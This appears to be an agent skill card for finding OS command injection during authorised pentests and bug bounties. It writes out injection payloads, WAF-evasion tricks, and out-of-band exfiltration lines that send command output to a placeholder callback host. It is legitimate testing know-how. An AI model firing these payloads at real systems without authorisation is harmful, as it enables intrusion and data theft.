---
name: web-command-injection
description: >
  Turn user input that reaches a shell into arbitrary OS command execution. Load when a parameter
  feeds a system call — ping/nslookup/host tools, file conversion (ImageMagick, ffmpeg), archive/
  export, PDF/thumbnail generation, filename handling, or any "network tools" feature. Signals:
  output that looks like command output, a value echoed into a system utility, blind time/OOB behaviour.
domain: web
type: technique
stability: locked
modes: [pentest, bugbounty]
severity: critical
owasp: [A03]
cwe: [CWE-78]
mitre: [T1059]
tools: [interactsh, ffuf, commix, burp]
schema_version: 1
---

# OS command injection

## When it applies
A parameter is concatenated into a shell command the server runs (a `ping` diagnostic, an
`ImageMagick`/`ffmpeg` convert, a `tar`/`zip`, a filename passed to a CLI). If the value reaches
`/bin/sh -c` unsanitised, you can append your own command.

## Why it works
Building a command string from input and handing it to a shell means shell metacharacters keep their
meaning: `;`, `|`, `&&`, `$()`, and backticks all start a new command in the same context (usually
the web user). The app never intended a second command — the shell can't tell the difference.

## Method
> **Payloads & full variation set:** [`cheatsheet.md`](cheatsheet.md) next to this file — work the set, not the first line.
1. **In-band test**: inject `; id`, `| id`, `$(id)`, `` `id` ``, and newline (`%0a id`). A `uid=…`
   in the response confirms execution.
2. **Blind (no output)** — pick one channel:
   - **Time**: `; sleep 10` (or `%0a ping -c 10 127.0.0.1`) → response stalls ⇒ execution.
   - **OOB**: `; nslookup $(whoami).<your-interactsh>` → a DNS/HTTP callback proves it and exfils.
3. **Get output when blind**: redirect into a web-readable path, or exfil via the OOB channel
   (`curl http://oob/$(id|base64)`).
4. **Bypass filters**: `$IFS`/`${IFS}` for spaces, quotes to split keywords (`w'h'o'am'i`),
   `$@`/`\`, base64-decode-pipe, or wildcards for blocked paths.
5. **Escalate to impact**: least-action proof (a benign `id`/OOB ping) — do not run destructive or
   data-exfil commands beyond what proves impact.

## Gotchas
- **Argument injection ≠ command injection**: if you can't break out of the command but can add
  flags (e.g. `-o`, `--output`), that alone can be high impact — test it too.
- A reflected `id`-looking string might be echoed, not executed — confirm with time or OOB.
- WAFs flag `;`/`|`; the `$IFS`/quote/encoding tricks above are for evasion, not novelty.

## Verify success
A controlled command runs: `id`/`hostname` in the response, a measurable `sleep` delay, or an OOB
callback carrying command output — reproducible, from a clean request.

## References
PortSwigger OS command injection; PayloadsAllTheThings Command Injection; GTFOBins (argument abuse).
